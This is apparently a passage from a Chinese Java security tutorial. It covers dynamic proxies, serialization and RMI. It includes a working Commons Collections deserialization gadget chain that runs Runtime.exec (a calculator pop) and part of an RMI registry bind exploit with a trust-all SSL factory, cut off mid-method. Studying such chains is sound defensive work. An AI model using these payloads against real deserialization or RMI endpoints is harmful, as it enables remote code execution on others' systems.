`java.lang.reflect.Proxy` 主要用于生成动态代理类 Class(**getProxyClass(ClassLoader, interfaces)**)、创建代理类实例(**newProxyInstance(ClassLoader, interfaces, InvocationHandler)**)，该类实现了 `java.io.Serializable` 接口。

`java.lang.reflect.InvocationHandler` 接口用于调用 Proxy 类生成的代理类方法，该类只有一个 invoke 方法，用于在代理实例上处理方法调用并返回结果，在与方法关联的代理实例上调用方法时，将在调用处理程序上调用此方法。


### defineClass0()

Proxy 类中还提供了一个**向指定类加载器中定义一个类对象**的方法 `defineClass0(ClassLoader loader, String name, byte[] b, int off, int len)`，类似 ClassLoader 和 Unsafe 提供的 defineClassx 方法，该方法可用于动态向 JVM 中创建类对象。

ProxyDefindClassDemo.java(jdk8):

```java
package com.ins.z.proxy;

import java.lang.reflect.Method;
import java.lang.reflect.Proxy;


public class ProxyDefindClassDemo {
    private static String TEST_CLASS_NAME = "com.ins.z.TestClass";
    private static byte[] TEST_CLASS_BYTES = new byte[] {
            -54, -2, -70, -66, 0, 0, 0, 52, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 14, 84, 101, 115, 116, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 14, 104, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 33, 33, 33, 1, 0, 19, 99, 111, 109, 47, 105, 110, 115, 47, 122, 47, 84, 101, 115, 116, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12
    };
    public static void main(String[] args) {
        // 获取系统的类加载器，可以根据具体情况换成一个存在的类加载器
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        try {
            // 反射 java.lang.reflect.Proxy 类获取其中的 defineClass0 方法
            Method method = Proxy.class.getDeclaredMethod("defineClass0", new Class[]{ ClassLoader.class,
                    String.class, byte[].class, int.class, int.class });
            // 修改方法的访问权限
            method.setAccessible(true);
            // 反射调用 java.lang.reflect.Proxy.defineClass0() 方法，动态向 JVM 注册 com.ins.z.TestClass 类对象
            Class testClass = (Class) method.invoke(null, new Object[]{
                    classLoader, TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length
            });
            // 输出 TestClass 类对象
            System.out.println(testClass); // Output: class com.ins.z.TestClass
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### getProxyClass / newProxyInstance

```java
/**
 * 创建动态代理类
 *
 * @param loader     定义代理类的类加载器
 * @param interfaces 代理类要实现的接口列表
 * @return 用指定的类加载器定义的代理类，它可以实现指定的接口
 */
public static Class<?> getProxyClass(ClassLoader loader, Class<?>... interfaces) {
    ...
}

 /**
 * 创建动态代理类实例
 *
 * @param loader     指定动态代理类的类加载器
 * @param interfaces 指定动态代理类的类需要实现的接口数组
 * @param h          动态代理处理类
 * @return 返回动态代理生成的代理类实例
 * @throws IllegalArgumentException 不正确的参数异常
 */
public static Object newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h)
        throws IllegalArgumentException {
    ...
}
```

我们可以使用 `Proxy.newProxyInstance()` 来创建动态代理类实例，或者使用 `Proxy.getProxyClass()` 获取代理类对象再反射的方式来创建代理类实例。动态代理添加方法调用日志示例：

CalculatorImpl 类实现了 Calculator 接口，通过 JDK 动态代理的方式给 **Calculator** 接口的方法**执行前后加上输出日志**。

GetProxyClassDemo.java:

```java
package com.ins.z.proxy;

import java.lang.reflect.Proxy;
import java.lang.reflect.Method;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;

interface Calculator {
    int add(int a, int b);
    int sub(int a, int b);
}

class CalculatorImpl implements Calculator {
    @Override
    public int add(int a, int b) {
        return a + b;
    }

    @Override
    public int sub(int a, int b) {
        return a - b;
    }
}
public class GetProxyClassDemo {
    public static void main(String[] args) throws Throwable {
        CalculatorImpl target = new CalculatorImpl();
        // 传入目标对象 1.根据它实现的接口生成代理对象 2.代理对象调用目标对象方法
        Calculator calculatorProxy = (Calculator) getProxy(target);
        calculatorProxy.add(1, 2);
        calculatorProxy.sub(2, 1);
    }

    private static Object getProxy(final Object target) throws Exception {
        // 参数1：随便找个类加载器给它， 参数2：目标对象实现的接口，让代理对象实现相同接口
        Class proxyClazz = Proxy.getProxyClass(target.getClass().getClassLoader(), target.getClass().getInterfaces());
        Constructor constructor = proxyClazz.getConstructor(InvocationHandler.class);
        Object proxy = constructor.newInstance(new InvocationHandler() {
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                System.out.println("即将调用 [" + this.getClass().getName() + "] 类的 [" + method.getName() + "] 方法...");
                Object result = method.invoke(target, args);
                System.out.println(">>> " + result);
                System.out.println("已完成 [" + this.getClass().getName() + "] 类的 [" + method.getName() + "] 方法调用...");
                return result;
            }
        });
        return proxy;
    }
}
```

编译 & 运行结果：

![](/assets/images/move/2021-02-16-19-17-33.png)

NewProxyInstanceDemo.java:

```java
package com.ins.z.proxy;

import java.lang.reflect.Proxy;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationHandler;

interface Calculator {
    int add(int a, int b);
    int sub(int a, int b);
}

class CalculatorImpl implements Calculator {
    @Override
    public int add(int a, int b) {
        return a + b;
    }

    @Override
    public int sub(int a, int b) {
        return a - b;
    }
}

public class NewProxyInstanceDemo {
    public static void main(String[] args) throws Exception {
        CalculatorImpl target = new CalculatorImpl();
        Calculator calculatorProxy = (Calculator) getProxy(target);
        calculatorProxy.add(1, 2);
        calculatorProxy.sub(2, 1);
    }
    private static Object getProxy(final Object target) throws Exception {
        return Proxy.newProxyInstance(
                target.getClass().getClassLoader(), // 指定动态代理类的类加载器
                target.getClass().getInterfaces(), // 定义动态代理生成的类实现的接口
                new InvocationHandler() {
                    @Override
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        System.out.println("即将调用 [" + this.getClass().getName() + "] 类的 [" + method.getName() + "] 方法...");
                        Object result = method.invoke(target, args);
                        System.out.println(">>> " + result);
                        System.out.println("已完成 [" + this.getClass().getName() + "] 类的 [" + method.getName() + "] 方法调用...");
                        return result;
                    }
                } // 动态代理处理类
        );
    }
}
```

编译 & 运行结果：

![](/assets/images/move/2021-02-17-00-33-12.png)


## 0x0a 反序列化

**序列化**是一种将对象状态(类成员变量及属性值)转换为字节流的机制，反序列化是与其相反的过程，其中字节流用于重新创建内存中的实际对象。此机制用于持久化对象，便于数据(对象)的存储和(在网络节点中的)传输。

![](/assets/images/move/2021-02-17-11-51-05.png)

> 在 `RMI`(Java 远程方法调用-Java Remote Method Invocation)和 `JMX` (Java 管理扩展-Java Management Extensions)服务中对象反序列化机制被强制性使用，在 Http 请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用 Base 编码序列化字节字符串的方式传递等。

当服务端允许接收远端数据进行反序列化时，客户端可以提供任意一个服务端存在的目标类的对象 （包括依赖包中的类的对象） 的序列化二进制串，由服务端反序列化成相应对象。如果该对象是由攻击者『精心构造』的恶意对象，而它自定义的 `readObject()` 中存在着一些『不安全』的逻辑，那么在对它反序列化时就有可能出现安全问题。

### Serializable

反序列化类对象时有如下限制：1. 被反序列化的类必须存在; 2. `serialVersionUID` 值必须一致。

只要实现了 `java.io.Serializable` (内部序列化)或 `java.io.Externalizable` (外部序列化)接口即可被序列化，其中 java.io.Externalizable 接口只是实现了 java.io.Serializable 接口。java.io.Serializable 是一个空接口， 无需实现其任何方法，仅用于标识该类可序列化，实现了 java.io.Serializable 接口的类原则上都需要生产一个 `serialVersionUID` 常量，反序列化时如果双方的 serialVersionUID 不一致会导致 `InvalidClassException` 异常。如果可序列化类未显式声明 serialVersionUID，则序列化运行时将基于该类的各个方面计算该类的默认 serialVersionUID 值。

DeserializeDemo.java:

```java
package com.ins.z.serializes;

import java.io.*;
import java.util.Arrays;

public class DeserializeDemo implements Serializable {
    protected String username;
    protected String password;

    DeserializeDemo() {
        this.username = "inspiringz";
        this.password = "aha?";
    }

    public static void main(String[] args) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            DeserializeDemo x = new DeserializeDemo();
            // serialize
            ObjectOutputStream o = new ObjectOutputStream(baos);
            o.writeObject(x); // java.io.ObjectOutputStream.writeObject()
            o.flush();
            o.close();
            System.out.println("DeserializeDemo 类序列化后的字节数组：" + Arrays.toString(baos.toByteArray()));
            // de-serialize
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream i = new ObjectInputStream(bais);
            DeserializeDemo t = (DeserializeDemo) i.readObject(); // java.io.ObjectInputStream.readObject()
            System.out.println("username: " + t.username + ", password: " + t.password);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

![](/assets/images/move/2021-02-17-12-32-38.png)

### Externalizable

java.io.Externalizable 和 java.io.Serializable 基本一致，其定义了 writeExternal 和 readExternal 方法需要序列化和反序列化的类实现。与 Serizable 接口不同，使用 Externalizable，就意味着没有任何东西可以自动序列化，为了正常的运行，我们需要在 writeExtenal() 方法中将自对象的重要信息写入，从而手动完成序列化。对于一个 Externalizable 对象，对象的默认构造函数都会被调用（包括哪些在定义时已经初始化的字段），然后调用 readExternal()，在此方法中必须手动恢复数据，从而借助 Externalizable 对序列化过程进行控制。

java.io.Externalizable.java:

```java
public interface Externalizable extends java.io.Serializable {

  void writeExternal(ObjectOutput out) throws IOException;

  void readExternal(ObjectInput in) throws IOException, ClassNotFoundException;

}
```

ExternalizableDemo.java:

```java
package com.ins.z.serializes;

import java.io.*;
import java.util.Arrays;

public class ExternalizableDemo implements Externalizable {
    protected String username;
    protected String password;

    public ExternalizableDemo() { // require public constructor
        this.username = "inspiringz";
        this.password = "aha?!!!?";
    }

    @Override
    public void writeExternal(ObjectOutput out) throws IOException {
        out.writeObject(this.username);
        out.writeObject(this.password);
    }

    @Override
    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
        this.username = (String) in.readObject();
        this.password = (String) in.readObject();
    }

    public static void main(String[] args) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ExternalizableDemo x = new ExternalizableDemo();
            // serialize
            ObjectOutputStream o = new ObjectOutputStream(baos);
            o.writeObject(x);
            o.flush();
            o.close();
            System.out.println("ExternalizableDemo 类序列化后的字节数组：" + Arrays.toString(baos.toByteArray()));
            // de-serialize
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream i = new ObjectInputStream(bais);
            ExternalizableDemo t = (ExternalizableDemo) i.readObject();
            System.out.println("username: " + t.username + ", password: " + t.password);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

![](/assets/images/move/2021-02-17-18-28-38.png)

### ReflectionFactory

反序列化时**不会调用类构造方法**，创建类实例时使用了 `sun.reflect.ReflectionFactory.newConstructorForSerialization` 创建了一个反序列化专用的 Constructor(反射构造方法对象)，可以绕过构造函数创建类实例。使用反序列化方法创建类实例：

```java
package com.ins.z.serializes;

import sun.reflect.ReflectionFactory;
import java.lang.reflect.Constructor;

public class ReflectionFactoryDemo {
    public static void main(String[] args) {
        try {
            ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
            /* newConstructorForSerialization(Class<?> cl, Constructor<?> constructorToCall) */
            Constructor constructor = rf.newConstructorForSerialization(
                DeserializeDemo.class, Object.class.getConstructor()
            );
            DeserializeDemo ins = (DeserializeDemo) constructor.newInstance();
            System.out.println(ins);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](/assets/images/move/2021-02-17-18-39-17.png)

### 自定义序列化

我们可以通过在待序列化或反序列化的类中定义 `readObject()` 和 `writeObject()` 方法，来实现自定义的序列化和反序列化操作，前提是被序列化的类必须有此方法，且方法的修饰符必须是 `private`。

Magic Method：

- private void writeObject(ObjectOutputStream oos), 自定义序列化。
- private void readObject(ObjectInputStream ois)，自定义反序列化。
- private void readObjectNoData()
- protected Object writeReplace()，写入时替换对象
- protected Object readResolve()

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    System.out.println("readObject...");
    ois.defaultReadObject();
}

private void writeObject(ObjectOutputStream oos) throws IOException {
    oos.defaultWriteObject();
    System.out.println("writeObject...");
}

private void readObjectNoData() {
    System.out.println("readObjectNoData...");
}

protected Object writeReplace() {
    System.out.println("writeReplace....");
    return null;
}

protected Object readResolve() {
    System.out.println("readResolve....");
    return null;
}
```

### Commons Collections

Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为 Apache 开源项目的重要组件，Commons Collections 被广泛应用于各种 Java 应用的开发。

Commons Collections 中提供了 Transformer 接口类，其功能为将输入对象转换为输出对象，输入对象应保持不变，常用于类型转换或从对象提取数据。Transformer.java:

```java
public interface Transformer {
    Object transform(Object var1);
}
```

![](/assets/images/move/2021-02-18-18-20-26.png)

`ConstantTransformer` 类是 Transformer 接口的实现类，其 transform() 函数讲一个对象转变成常量并返回。ConstantTransformer.java:

```java
public class ConstantTransformer implements Transformer, Serializable {
    static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;
    [...]
    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }
    public Object transform(Object input) {
        return this.iConstant;
    }
```

`InvokerTransformer` 类主要作用为利用 Java 反射机制来创建类实例，其中 transform 方法通过反射的方式获取 input 对象的特定方法并执行。

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    this.iMethodName = methodName;
    this.iParamTypes = paramTypes;
    this.iArgs = args;
}

public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        } catch ...
```

![](/assets/images/move/2021-02-18-18-31-35.png)

`ChainedTransformer` 类实现了 Transformer 链式调用，只需要传入一个 Transformer 数组即可实现依次的去调用每一个 Transformer 的 transform 方法，并将转化结果作为参数传递到下一步。

```java
public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }

public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }
    return object;
}
```

![](/assets/images/move/2021-02-18-18-43-35.png)

`TransformedMap` 类提供将 map 和转换链(ChainedTransformer)绑定的构造函数，只需要添加数据(setValue/put/putAll)至 map 中就会自动调用该转换链，即把触发条件从显性的调用转换链的 transform 函数延伸到修改 map 的值。

```java
@Test
public void mapt() {
    String cmd = "open -a Calculator.app";
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(
                    "getMethod", new Class[]{ String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[]{\}\}
            ),
            new InvokerTransformer("invoke", new Class[]{
                    Object.class, Object[].class}, new Object[]{null, new Object[0]}
            ),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
    };
    Transformer transformedChain = new ChainedTransformer(transformers);
    Map map = new HashMap();
    map.put("value", "value");
    Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
    for (Object obj : transformedMap.entrySet()) {
        Map.Entry entry = (Map.Entry) obj;
        entry.setValue("test"); // trigger!
    }
}
```

![](/assets/images/move/2021-02-18-18-59-26.png)

> **AnnotationInvocationHandler** is the invocation handler for (implements the behaviour for) annotation objects in Java. It has a Class object representing the type of the annotation, and a map from properties to values. When you call a method on the annotation interface, it will return the corresponding value from the map.

> sun.reflect.annotation.`AnnotationInvocationHandler` 类实现了 java.lang.reflect.InvocationHandler(Java 动态代理)接口和 java.io.Serializable 接口，它还重写了 readObject 方法，在 readObject 方法中还间接的调用了 TransformedMap 中 MapEntry 的 setValue 方法，从而也就触发了 transform 方法，完成了整个攻击链的调用。

完整攻击链代码(`jdk7`)：

```java
package com.ins.z;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class CC {
    public static void main(String[] args) {
        String cmd = "open -a Calculator.app";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };
        Transformer transformedChain = new ChainedTransformer(transformers);
        Map map = new HashMap();
        map.put("value", "value");
        Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

        try {
            // 获取 AnnotationInvocationHandler 类对象
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            // 获取 AnnotationInvocationHandler 类的构造方法
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            // 设置构造方法的访问权限
            constructor.setAccessible(true);
            // 创建含有恶意攻击链(transformedMap)的 AnnotationInvocationHandler 类实例，等价于：
            // Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
            Object instance = constructor.newInstance(Target.class, transformedMap);
            // 创建用于存储 payload 的二进制输出流对象
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            // 创建 Java 对象序列化输出流对象
            ObjectOutputStream out = new ObjectOutputStream(baos);
            // 序列化AnnotationInvocationHandler类
            out.writeObject(instance);
            out.flush();
            out.close();
            // 获取序列化的二进制数组
            byte[] bytes = baos.toByteArray();
            // 输出序列化的二进制数组
            System.out.println("Payload 攻击字节数组：" + Arrays.toString(bytes));
            // 利用 AnnotationInvocationHandler 类生成的二进制数组创建二进制输入流对象用于反序列化操作
            ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
            // 通过反序列化输入流(bais),创建 Java 对象输入流(ObjectInputStream)对象
            ObjectInputStream in = new ObjectInputStream(bais);
            // 模拟远程的反序列化过程
            in.readObject();
            // 关闭ObjectInputStream输入流
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

反序列化调用链：

```
ObjectInputStream.readObject()
  ->AnnotationInvocationHandler.readObject()
      ->TransformedMap.entrySet().iterator().next().setValue()
          ->TransformedMap.checkSetValue()
        ->TransformedMap.transform()
          ->ChainedTransformer.transform()
            ->ConstantTransformer.transform()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Class.getMethod()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Runtime.getRuntime()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Runtime.exec()
```

## 0x0b RMI

`RMI`(Remote Method Invocation, Java 远程方法调用)，一种用于实现远程过程调用 `RPC` (Remote Procedure Call) 的 Java API，即**一个 JVM 中的代码可以通过网络实现远程调用另一个 JVM 的某个方法**，能直接传输序列化后的 Java 对象和分布式垃圾回收。它的实现依赖于 Java 虚拟机(JVM)，因此它仅支持从一个 JVM 到另一个 JVM 的调用。


`RMI` 可以使用以下协议实现：

- `JRMP` Java Remote Method Protocol：RMI 专用的 Java 远程消息交换协议。

- `IIOP` Internet Inter-ORB Protocol：基于 CORBA 实现的对象请求代理协议。

RMI 程序通常包括:

- RMI Registry：存储注册对象的 Remote Objecct Reference(Stub)，提供 Stub 的绑定和查询。仅可对同一主机上运行的 registry 调用 bind/rebind/unbind，而 lookup/list 可远程调用。虽然不能对远程 registry 调用 bind，但远程 registry 实际会对任意输入反序列化，因此存在被反序列化 RCE 的风险。

- RMI Client：通过该 name 向 registry 获取 Remote Objecct Reference(Stub)，从 Stub 中获取 JNDI server addr，再请求 server。

- RMI Service：创建 Remote Object，将其注册到 RMI Registry，存储对象数据。不一定和 Registry 在同一个 JVM，是方法执行的地方，仅把方法返回值返回给 Client。

![](/assets/images/move/2021-02-19-11-07-49.png)

RMI 交互过程：

![](/assets/images/move/2021-02-19-11-38-01.png)

RMI 客户端及服务端实现：

1\. 服务端编写远程接口 RMIInterface:

```java
package com.ins.z.rmi;

import java.rmi.Remote;
import java.rmi.RemoteException;

//extends Remote & throws RemoteException
public interface RMIInterface extends Remote {
    public String hello() throws RemoteException;
}
```

2\. 服务端编写 RemoteClass：

```java
package com.ins.z.rmi;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteClass extends UnicastRemoteObject implements RMIInterface {
    public RemoteClass() throws RemoteException {
    }
    @Override
    public String hello() throws RemoteException {
        return "Hello World!";
    }
}
```

3\. 服务端编写 Server：

```java
package com.ins.z.rmi;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException {
        RMIInterface hello = new RemoteClass();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.rebind("hello", hello);
    }
}
```

4\. 客户端部署：

```java
package com.ins.z.rmi;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        RMIInterface hello = (RMIInterface) registry.lookup("hello");
        System.out.println(hello.hello());
    }
}
```

### bind/rebind

从 Client 接收到的 bind 或 rebind 的 remote obj，将由 `sun.rmi.registry.RegistryImpl_Skel#dispatch` 处理， 获取到的序列化数据直接调用了 `readObject` 函数，导致了常规的 Java 反序列化漏洞的触发。

> Registry 对于 bind/rebind 的请求，会去检查这个请求是否为本地请求，对于外部的请求，Registry 会拒绝该请求，以防止外部的恶意绑定。在 `JDK 8u141` 之前，首先会接收传送过来的对象，并将其进行 `readObject()` 反序列化，实际判断是否为本地请求 checkAccess()，是在 put 新的绑定对象之前进行的，该限制没有起到相应的作用。在 `JDK 8u141` 之后，会先去判断是否为本地绑定请求，然后再进行反序列化。



LazyMap + AnnotationInvocationHandler 利用链：

```java
ObjectInputStream.readObject()
  ->AnnotationInvocationHandler.readObject() // Ann(proxyMap(Ann(lazyMap)))
    -> memberValues.entrySet().iterator() // proxyMap(Ann(lazyMap)).entrySet().iterator() trigger!
      ->AnnotationInvocationHandler.invoke() // proxyMap(Ann(lazyMap)).invoke()
        ->LazyMap.get() // this.memberValues.get(var4); => Ann(lazyMap).memberValues.get(var4) => lazyMap#get
        ->LazyMap.factory.transform()
          ->ChainedTransformer.transform()
            ->ConstantTransformer.transform()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Class.getMethod()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Runtime.getRuntime()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Runtime.exec()
```

LazyMap 在其 get 方法中执行 factory.transform 触发 Runtime#exec 的执行链，AnnotationInvocationHandler 类实现了 InvocationHandler 和 Serializable 接口，其 invoke 方法执行了 this.memberValues.get(var4)，可以用于触发 LazyMap#get，再通过 Java 动态代理机制即可通过在 AnnotationInvocationHandler#readObject 中调用任意(Map)方法即可触发 AnnotationInvocationHandler#invoke 方法。因此我们可以把构造好的 (Map)LazyMap 包裹到 AnnotationInvocationHandler 类实例 (InvocationHandler)handler 中，然后通过 Proxy#newProxyInstance 将 handler 作为动态代理处理类来创建动态代理类实例 (Map)mapProxy，最后将 mapProxy 包裹到 AnnotationInvocationHandler 类实例 (InvocationHandler) last 中即可，当反序列化 last 时将执行 readObject 方法，只要在 readObject 中调用 Map#entrySet 方法，就会进入到 AnnotationInvocationHandler#invoke 方法中，进而触发我们的 LazyMap#get。

```java
package com.ins.z.rmi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.lang.annotation.Annotation;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;

public class BindDemo {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
    public static final String RMI_HOST = "127.0.0.1";
    public static final String RMI_PORT = "1099";

    // 信任 SSL 证书
    private static class TrustAllSSL implements X509TrustManager {
        private static final X509Certificate[] ANY_CA = {};
        public X509Certificate[] getAcceptedIssuers() { return ANY_CA; }
        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
    }

    // 创建支持 SSL 的 RMI 客户端
    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
        public Socket createSocket(String host, int port) throws IOException {
            try {
                // 获取 SSLContext 对象
                SSLContext ctx = SSLContext.getInstance("TLS");

                // 默认信任服务器端 SSL
                ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);

                // 获取 SSL Socket 连接工厂
                SSLSocketFactory factory = ctx.getSocketFactory();

                // 创建 SSL 连接
                return factory.createSocket(host, port);
            } catch (Exception e) {
                throw new IOException(e);
            }
        }
    }

    /**
     * 使用动态代理生成基于 InvokerTransformer/LazyMap 的 Payload
     *
     * @param command 定义需要执行的 CMD
     * @return Payload
     * @throws Exception 生成Payload异常
     */
    private static InvocationHandler genPayload(String command) throws Exception {
        // 创建 Runtime.getRuntime.exec(cmd) 调用链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };

        // 创建 ChainedTransformer 调用链对象
        Transformer transformerChain = new ChainedTransformer(transformers);
        // 使用 LazyMap 创建一个含有恶意调用链的 Transformer 类的 Map 对象
        final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
        // 获取 AnnotationInvocationHandler 类对象
        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);
        // 获取 AnnotationInvocationHandler 类的构造方法
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        // 设置构造方法的访问权限
        constructor.setAccessible(true);
        // 实例化 AnnotationInvocationHandler
        // => InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap);
        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        // 使用动态代理创建出 Map 类型的 Payload
        final Map mapProxy2 = (Map) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler
        );
        // 实例化 AnnotationInvocationHandler，
        // => InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2);
        return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2);
    }

    /**
     * 执行 Payload
     *
     * @param registry RMI Registry
     * @param command  需要执行的命令
     * @throws Exception Payload执行异常
     */
    public static void exploit(final Registry registry, final String command) throws Exception {
        // 生成 Payload 动态代理对象
        Object payload = genPayload(command);
        String name    = "test" + System.nanoTime();
        // 创建一个含有 Payload 的恶意 map
        Map<String, Object> map = new HashMap();
        map.put(name, payload);
        // 获取 AnnotationInvocationHandler 类对象
        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);
        // 获取 AnnotationInvocationHandler 类的构造方法
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        // 设置构造方法的访问权限
        constructor.setAccessible(true);
        // 实例化 AnnotationInvocationHandler，
        // => InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map);
        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
        // 使用动态代理创建出 Remote 类型的 Payload
